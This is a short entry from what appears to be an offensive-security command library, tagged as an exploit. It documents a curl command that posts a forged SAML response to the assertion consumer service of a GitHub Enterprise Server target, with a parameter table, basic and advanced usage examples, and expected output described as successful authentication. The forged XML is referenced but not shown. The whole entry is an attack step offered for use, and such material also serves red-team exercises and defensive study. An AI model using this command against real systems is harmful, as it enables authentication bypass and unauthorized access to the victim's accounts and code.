---
data: >-
  curl -X POST https://target-ghes.example.com/saml/acs -d @forged.xml --header
  'Content-Type: application/xml'
tags:
  - exploit
  - saml
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 30c04a2d-ac10-401e-a532-4bce010c470d
created_at: '2025-12-13T09:01:26.740Z'
updated_at: '2025-12-13T09:01:26.740Z'
verified: false
validated: true
submitted: true
---
# Submit SAML Response

## Command

```bash
curl -X POST https://target-ghes.example.com/saml/acs -d @forged.xml --header 'Content-Type: application/xml'
```

## Description

This command submits a forged SAML response to the assertion consumer service for exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `https://target-ghes.example.com/saml/acs` | Endpoint URL | Yes |
| `-d @forged.xml` | Data from file | Yes |
| `--header 'Content-Type: application/xml'` | Content type header | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target-ghes.example.com/saml/acs -d @forged.xml --header 'Content-Type: application/xml'
```

### Advanced Usage

```bash
curl -X POST -H 'Authorization: Basic creds' https://target-ghes.example.com/saml/acs -d @forged.xml --header 'Content-Type: application/xml'
```

## Expected Output

HTTP response indicating successful authentication or access grant.

## Related
- [[procedures/Submit-Forged-SAML-Response]]
- [[commands/modify-xml-signature]]
